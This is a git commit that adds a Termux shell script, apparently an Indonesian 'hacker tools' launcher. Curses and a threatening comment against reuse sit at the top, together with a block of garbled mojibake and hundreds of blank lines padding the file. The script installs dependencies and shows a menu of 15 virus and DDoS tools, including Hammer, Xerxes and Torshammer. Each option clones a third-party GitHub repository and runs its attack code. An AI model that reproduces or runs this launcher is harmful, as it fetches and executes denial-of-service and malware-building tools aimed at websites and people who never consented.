60a39e6d478fec71ea7f95afae69542fcf6ef52c
N1C3-FR13ND-hacker <66993314+N1C3-FR13ND-hacker@users.noreply.github.com>
2020-06-16 19:46:06 +0700

    Add files via upload

---
+++ Readmei.sh
@@ -0,0 +1,671 @@
+#import mashral
+#gak usah di recode nanti eror goblok=ðŸ˜‰ðŸ˜ƒðŸ˜†ðŸ˜ƒðŸ˜¯ðŸ˜ ðŸ˜¯ðŸ˜¦ðŸ˜²ðŸ˜°ðŸ˜¦ðŸ˜§ðŸ˜�ðŸ™…ðŸ˜šðŸ˜ŒðŸ˜˜ðŸ˜ŒðŸ˜�ðŸ˜·ðŸ˜§ðŸ˜§ðŸ˜°ðŸ˜§ðŸ˜§ðŸ˜�ðŸ˜®ðŸ˜�ðŸ˜°ðŸ˜³ðŸ˜©ðŸ˜§ðŸ˜²ðŸ˜§ðŸ˜§ðŸ˜§ðŸ˜²ðŸ˜§ðŸ˜²ðŸ˜°ðŸ˜°ðŸ˜§ðŸ˜°ðŸ˜§ðŸ˜§ðŸ˜°ðŸ˜³ðŸ˜°ðŸ˜§ðŸ˜§ðŸ˜°ðŸ˜§ðŸ˜°ðŸ˜§ðŸ˜°ðŸ˜³ðŸ˜§ðŸ˜°ðŸ˜§ðŸ˜°ðŸ˜³ðŸ˜°ðŸ˜³ðŸ˜§ðŸ˜§ðŸ˜©ðŸ˜§ðŸ˜³ðŸ˜©ðŸ˜°ðŸ˜�ðŸ˜°ðŸ˜°ðŸ˜§ðŸ˜©ðŸ˜³ðŸ˜›ðŸ˜©ðŸ˜³ðŸ˜©ðŸ˜©ðŸ˜§ðŸ˜�ðŸ˜°ðŸ˜°ðŸ˜§ðŸ˜²ðŸ˜ŸðŸ˜§ðŸ˜£ðŸ˜¢ðŸ˜¦ðŸ˜²ðŸ˜£ðŸ˜‚ðŸ˜ƒðŸ˜¯ðŸ˜‰ðŸ˜‚ðŸ˜†ðŸ˜ƒðŸ˜ƒðŸ˜¯ðŸ˜¯ðŸ˜¯ðŸ˜‘ðŸ˜‘ðŸ˜¡ðŸ˜•ðŸ˜¢ðŸ˜…ðŸ˜ŠðŸ˜ŠðŸ˜ŠðŸ˜ŠðŸ˜ŠðŸ˜¯ðŸ˜¯ðŸ˜„ðŸ˜…ðŸ˜¯ðŸ˜¯ðŸ˜�ðŸ˜ ðŸ˜¦ðŸ˜•ðŸ˜¦ðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜…ðŸ˜¯ðŸ˜¯ðŸ˜†ðŸ˜¯ðŸ˜¢ðŸ˜†ðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜¯ðŸ˜†ðŸ˜¡ðŸ˜†ðŸ˜¢ðŸ˜ƒðŸ˜†ðŸ˜¢ðŸ˜•ðŸ˜¯ðŸ˜•ðŸ˜¯ðŸ˜¯ðŸ˜…ðŸ˜¯ðŸ˜…ðŸ˜¯ðŸ˜¯ðŸ˜†ðŸ˜¯ðŸ˜¯ðŸ˜†ðŸ˜¯ðŸ˜†ðŸ˜¯ðŸ˜†ðŸ˜¢ðŸ˜†ðŸ˜¢ðŸ˜¢ðŸ˜•ðŸ˜•ðŸ˜¢ðŸ˜•ðŸ˜¢ðŸ˜†ðŸ˜¢ðŸ˜¯ðŸ˜…ðŸ˜†ðŸ˜¢ðŸ˜¢ðŸ˜•ðŸ˜¯ðŸ˜…ðŸ˜¯ðŸ˜•ðŸ˜†ðŸ˜¢ðŸ˜¯ðŸ˜†ðŸ˜¢ðŸ˜†ðŸ˜†ðŸ˜•ðŸ˜•ðŸ˜¡ðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ƒðŸ˜ƒðŸ˜€ðŸ˜¯ðŸ˜…ðŸ˜…ðŸ˜¢ðŸ˜•ðŸ˜¢ðŸ˜‘ðŸ˜¡ðŸ˜‘ðŸ˜‘ðŸ˜¯ðŸ˜‘ðŸ˜¯ðŸ˜¡ðŸ˜•ðŸ˜•ðŸ˜¯ðŸ˜¯ðŸ˜‘ðŸ˜…ðŸ˜¯ðŸ˜¯ðŸ˜•ðŸ˜¯ðŸ˜…ðŸ˜¢ðŸ˜•ðŸ˜¢ðŸ˜•ðŸ˜¢ðŸ˜•ðŸ˜¢ðŸ˜¢ðŸ˜‘ðŸ˜¯ðŸ˜…ðŸ˜¯ðŸ˜¢ðŸ˜†ðŸ˜¡ðŸ˜¯ðŸ˜¡ðŸ˜†ðŸ˜¡ðŸ˜†ðŸ˜¡ðŸ˜•ðŸ˜¡ðŸ˜• teks:Ð´Ð²Ã‡Î´Ð·fÐ±Ð½ijÐºlÐ¼Ð¸Ã¸Ñ€qÑ�sÑ‚Ñ†vÑ‰xzzÐ´Ð²Ã‡Î´Ð·fÐ±Ð½ijÐºlÐ¼Ð¸Ã¸Ñ€qÑ�sÑ‚Ñ†vÑ‰xzz aÐ¬cdÑ”fgÐ½Ñ—jÐºlÐ¼Ð¸Ð¾pqÑ�$Ñ‚Ñ†vÑˆÐ¶zzaÐ¬cdÑ”fgÐ½Ñ—jÐºlÐ¼Ð¸Ð¾pqÑ�$Ñ‚Ñ†vÑˆÐ¶zz Î±Ð²Â¢Ä‘Ñ”Æ’gÐ½Î¹ÄµÐºÄ»Ð¼Î·ÏƒÏ�qÑ�Ñ•Ñ‚Ï…Î½Ï‰Ï‡zzÎ±Ð²Â¢Ä‘Ñ”Æ’gÐ½Î¹ÄµÐºÄ»Ð¼Î·ÏƒÏ�qÑ�Ñ•Ñ‚Ï…Î½Ï‰Ï‡zz Î±ÃŸÂ¢â…¾â„¯Æ’â�¡â„Œá¸¯× ÐºÅ‚áƒ¦Î·Ã¸â„˜â“ Ñ�ï¹©Ñ‚ÊŠâ™¥áº˜âœ–â„¨â„¨Î±ÃŸÂ¢â…¾â„¯Æ’â�¡â„Œá¸¯× ÐºÅ‚áƒ¦Î·Ã¸â„˜â“ Ñ�ï¹©Ñ‚ÊŠâ™¥áº˜âœ–â„¨â„¨ Î¬Ð²Â¢Ä‘Ñ”à¤¿Î´Ð‚Ä¯ÄµÐºâ„“Ð¼Ð¹Ã°Ï�qÑ�Å¡Ñ‚Ï‹Î½ÏŽÏ‡Å¾Å¾Î¬Ð²Â¢Ä‘Ñ”à¤¿Î´Ð‚Ä¯ÄµÐºâ„“Ð¼Ð¹Ã°Ï�qÑ�Å¡Ñ‚Ï‹Î½ÏŽÏ‡Å¾Å¾ Ã¤ÃŸÃ§Ã�Ø¹FgÑ’Â¡Ê–kâ„“Ð¼â‚ªÙ¥ÃžQÑ�Â§Ñ‚ÂµâˆšÐ¨xÅ¾Å¾Ã¤ÃŸÃ§Ã�Ø¹FgÑ’Â¡Ê–kâ„“Ð¼â‚ªÙ¥ÃžQÑ�Â§Ñ‚ÂµâˆšÐ¨xÅ¾Å¾ Î±ÐªÏ‚Î´Î­fÐ±Ð‹Î�jÐºÄ»Ð¼Ð¸ÏƒpqÑ�ÅŸÏ„Ï…vÏŽÏ‡Î±ÐªÏ‚Î´Î­fÐ±Ð‹Î�jÐºÄ»Ð¼Ð¸ÏƒpqÑ�ÅŸÏ„Ï…vÏŽÏ‡ Î±Î²cÎ´ÎµÅ¦Ä�hÎ¹jÎºlÊ�Ï€Ã¸Ï�Ï†Æ¦$â€ uÏ…Ï‰Ï‡zzÎ±Î²cÎ´ÎµÅ¦Ä�hÎ¹jÎºlÊ�Ï€Ã¸Ï�Ï†Æ¦$â€ uÏ…Ï‰Ï‡zz Î›ÃŸÆ‡DÆ�FÆ“Ä¤ÄªÄ´Ò Ä¿MÐ˜â™¡á¹–Ò¨Å”SÅ¦Æ±âˆšÑ Ó¾ZZÎ›ÃŸÆ‡DÆ�FÆ“Ä¤ÄªÄ´Ò Ä¿MÐ˜â™¡á¹–Ò¨Å”SÅ¦Æ±âˆšÑ Ó¾ZZ ï¾‘ä¹ƒÎ¶Ã�ä¹‡ï½·Ç¤ã‚“ï¾‰ï¾Œã‚ºï¾šá„Šåˆ€Ô¾ï½±Qå°ºä¸‚ï½²Ð¦Ð�Ð©ï¾’ä¹™ä¹™ï¾‘ä¹ƒÎ¶Ã�ä¹‡ï½·Ç¤ã‚“ï¾‰ï¾Œã‚ºï¾šá„Šåˆ€Ô¾ï½±Qå°ºä¸‚ï½²Ð¦Ð�Ð©ï¾’ä¹™
+#yang recode besok ibu nya mati
+#mau recode yaaa gak bisa udah gue Import mashral
+
+
+
+#Facebook name:Andi Zet (Hacker Pro)
+#No wa:089524437115
+#Name hacker:N1C3 FR13ND
+
+#! sd/system>1919321452193 <Run public
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#gak usah di recode
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+
+clear
+pkg install git
+pkg install mechanize
+pkg install update && pkg install upgrade
+pkg install python
+pkg install python2
+pkg install lolcat
+pkg install figlet
+pkg install requests
+pkg install pip2
+pip2 install yagmail
+pip2 install mechanize
+pip2 install requests
+pip2 install -r requirements.txt 
+pip2 install bs4
+
+clear
+echo $red   "─▄────▄▄▄▄▄▄▄────▄─"
+sleep 2
+echo $red   "▀▀▄─▄█████████▄─▄▀▀"
+sleep 2
+echo $red   "────██─▀███▀─██────"
+sleep 3
+echo $red   "──▄─▀████▀████▀─▄──"
+sleep 4
+echo $red   "▀█────██▀█▀██────█▀"
+sleep 3
+echo 
+echo
+echo $cyan  "[+==============================+]"
+echo $red   "[+]BY : N1C3 FR13ND              ]"
+echo $red   "[+]FB : Andi ZET                 ]"
+echo $red   "[+]WA : 089524437115             ]"
+echo $cyan  "[+==============================+]"
+echo
+echo
+echo $cyan  "[+][KUMPULAN TOOLS V1R73K][+]"
+echo $red   "<-=========================->" 
+echo
+sleep 3
+echo $red   "[1][Virus Sploit-Malicious][+]"
+sleep 3
+echo
+echo $cyan  "[2][Virus VBUG            ][+]"
+echo
+sleep 3
+echo $red   "[3][VIRTEX GaNas          ][+]"
+echo
+sleep 3
+echo $cyan  "[4][Perusak               ][+]"
+echo
+sleep 3
+echo $red   "[5][Torajan               ][+]"
+echo
+sleep 3
+echo $cyan  "[6][HAMMER                ][+]"
+echo
+sleep 3
+echo $red   "[7][LUCINTA DDOS          ][+]"
+echo
+sleep 4
+echo $cyan  "[8][Win 32DDOS ATTACK     ][+]"
+echo
+sleep 3
+echo $red   "[9][XERXES                ][+]"
+echo
+sleep 3
+echo $cyan  "[10][TORSHAMMER           ][+]"
+echo
+sleep 3
+echo $red   "[11][VANESSA ANGGEL DDOS  ][+]"
+echo
+sleep 3
+echo $cyan  "[12][DDOS BY.BLACKCYC     ][+]"
+echo
+sleep 3
+echo $red   "[13][VIRUS ID             ][+]"
+echo
+sleep 4
+echo $cyan  "[14][Virus Reset TOTAL    ][+]"
+echo
+sleep 3
+echo $red   "[15][Virus Blank          ][+]"
+sleep 3
+echo $cyan  "<-==========================->"
+echo
+echo $cyan  
+echo $cyan"┌==="$bi"[ N1C3 FR13ND ]"
+echo $cyan"¦"
+read -p"-->" root;
+
+
+
+
+if [ $root = 1 ] || [ $root = 01 ]
+then
+clear
+figlet "Keren" | lolcat
+termux-setup-storage
+cd /sdcard
+git clone https://github.com/TheSploit/Sploit-Malicious
+cd Sploit-Malicious
+python2 malicious.py
+fi
+
+
+
+if [ $root = 2 ] || [ $root = 02 ]
+then
+clear
+figlet "Mantul" | lolcat
+git clone https://github.com/d3L3t3dOn3/vbug
+cd vbug
+unzip vbug.zip
+cd vbug 
+python2 vbug.py
+fi
+
+
+if [ $root = 3 ] || [ $root = 03 ]
+then
+clear
+figlet "Cool" | lolcat
+git clone https://github.com/IntiTutorial/VIRTEX
+cd VIRTEX
+chmod +x VIRTEX.sh
+sh VIRTEX.sh
+fi
+
+
+if [ $root = 4 ] || [ $root = 04 ]
+then
+clear
+figlet "janji" | lolcat
+git clone https://github.com/justahackers/perusak
+cd perusak
+python2 perusak.py
+fi
+
+
+
+if [ $root = 5 ] || [ $root = 05 ]
+then
+clear
+figlet "jijik" | lolcat
+git clone https://github.com/4L13199/meTAInstall
+cd meTAInstall
+chmod +x meTAInstall.sh
+sh meTAInstall.sh
+fi
+
+
+
+if [ $root = 6 ] || [ $root = 06 ]
+then
+clear
+figlet "sayang" | lolcat
+git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+fi
+
+
+
+if [ $root = 7 ] || [ $root = 07 ]
+then
+clear
+figlet "Waduhh" | lolcat
+git clone https://github.com/zlucifer/lucita_ddos
+cd lucita_ddos
+chmod +x pukul.py
+python pukul.py
+fi
+
+
+
+if [ $root = 8 ] || [ $root = 08 ]
+then
+clear
+figlet "Lanjut" | lolcat
+git clone https://github.com/banghyuu/ddosWD
+cd ddosWD
+sh Ddos.sh
+fi
+
+
+
+
+if [ $root = 9 ] || [ $root = 09 ]
+then
+clear
+figlet "Kenapa" | lolcat
+git clone https://github.com/zanyarjamal/xerxes
+cd xerxes
+clang xerxes.c -o xerxes
+echo $red "./xerxes (nama website) 80"
+fi
+
+
+
+if [ $root = 10 ]
+then
+clear
+figlet "Cinta" | lolcat
+git clone https://github.com/dotfighter/torshammer.git
+cd torshammer
+chmod +x torshammer.py
+python2 torshammer.py
+fi
+
+
+
+if [ $root = 11 ]
+then
+clear
+figlet "Corona" | lolcat
+git clone https://github.com/MiSetya/VA-DDOS
+cd VA-DDOS
+chmod +x 80juta.py
+python2 80juta.py
+fi
+
+
+
+
+if [ $root = 12 ]
+then
+clear
+figlet "Virus" | lolcat
+git clone https://github.com/BlackCyberAnonim/B-ATTACKING
+cd B-ATTACKING
+ls
+sh install.Sh
+fi
+
+
+
+if [ $root = 13 ]
+then
+clear
+figlet "Bahaya" | lolcat
+git clone https://github.com/B4N954N2-ID/VIRUS
+cd VIRUS
+python2 VIRUS.py
+fi
+
+
+
+
+if [ $root = 14 ]
+then
+clear
+figlet "N1C3" | lolcat
+figlet "FR13ND " | lolcat
+git clone https://github.com/B4TAK/ELITE-VIPER
+cd ELITE-VIPER
+sh install.sh
+python2 BLACKVIPER.py
+fi
+
+
+
+if [ $root = 15 ]
+then
+clear
+figlet "terakhir" | lolcat
+git clone https://github.com/LOoLzeC/Evil-create-framework
+cd Evil-create-framework
+echo $cyan "Toturial nya lihat di link ini"
+echo $red  "https://youtu.be/8kQRBkI7qck"
+sleep 19
+python2 vcrt.py
+fi
